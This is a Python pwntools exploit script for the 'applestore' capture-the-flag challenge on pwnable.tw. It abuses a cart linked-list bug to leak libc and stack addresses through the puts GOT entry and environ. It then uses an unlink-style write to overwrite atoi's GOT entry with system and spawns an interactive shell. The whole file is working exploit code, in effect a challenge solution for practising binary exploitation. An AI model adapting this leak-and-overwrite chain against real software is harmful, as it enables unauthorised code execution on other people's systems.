#!/usr/bin/env python3

from inspect import stack

from pwn import *

elf = ELF("applestore_patched")
libc = ELF("./libc.so.6")

context.binary = elf
context.terminal = "kitty @ launch --location=vsplit --cwd=current".split()
context.log_level = 'debug'

def conn():
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10104)
    else:
        if args.GDB:
            p = gdb.debug([elf.path], aslr=True, api=False, gdb_args=["-x", "./helper.py"], gdbscript="""
                b checkout
                b delete
                b *delete+71
                b *delete+214
                b *handler+115
                b cart
                b list
                """)
        else:
            p = process([elf.path])

    return p

def menu(p, opt):
    p.sendafter(b"> ", str(opt).encode())

def add(p, idx):
    menu(p, 2)
    p.sendafter(b"Device Number> ", str(idx).encode())

def delete(p, idx):
    menu(p, 3)
    p.sendafter(b"Item Number> ", idx) 

    raw_data = p.recvuntil(b"cart.\n").strip()
    tokens = raw_data.split(b" ")

    idx = tokens[1].split(b":")[0]
    name = tokens[1].split(b":")[1]
    
    log.info(f"deleted node {idx}, name: {name}")

    return idx, name


def list_items(p):
    menu(p, 4)
    p.sendafter(b"(y/n) > ", b"y")
    p.recvuntil(b"==== Cart ====\n")

    raw_data = p.recvuntil(b"\n> ")
    lines = raw_data.split(b"\n")

    items = []
    for line in lines:
        line = line.strip()

        if not line:
            continue

        idx, rest = line.split(b":", 1)
        name, price = rest.split(b" - $", 1)
        
        items.append({
                "index": int(idx),
                "name": name,
                "price": int(price)
            })

    return items

def checkout(p):
    menu(p, 5)
    p.sendafter(b"(y/n) > ", b"y")

def main():
    p = conn()

    # pwn it
    qtd1 = 6
    qtd2 = 20

    for _ in range(qtd1):
        add(p, 1)

    for _ in range(qtd2):
        add(p, 2)

    checkout(p)

    payload = b"27"
    payload += p32(elf.got.puts)
    payload += p32(666)
    payload += p32(0x0)
    payload += p32(0x0)

    _, name = delete(p, payload) 
    
    leaked_addr = u32(name[0:4])

    libc.address = leaked_addr - libc.sym.puts
    log.success(f"libc base address: {hex(libc.address)}")

    environ = libc.sym.environ
    payload = b"27"
    payload += p32(environ)
    payload += p32(666)
    payload += p32(0x0) * 2

    _, name = delete(p, payload) 

    leak = u32(name[0:4])
    log.info(f"leak: {hex(leak)}")

    fake_node = leak - 0x124
    log.info(f"node allocated on stack: {hex(fake_node)}")

    saved_ebp = fake_node + 0x20

    system = libc.sym.system
    atoi_got = elf.got.atoi

    log.info(f"system addr: {hex(system)}")

    payload = b"27"
    payload += p32(elf.bss())
    payload += p32(666) 
    payload += p32(saved_ebp-0xc)
    payload += p32(atoi_got + 0x22)
    
    delete(p, payload)

    payload = p32(system) + b";sh\x00"
    p.sendafter(b"> ", payload)

    p.interactive()

if __name__ == '__main__':
    main()

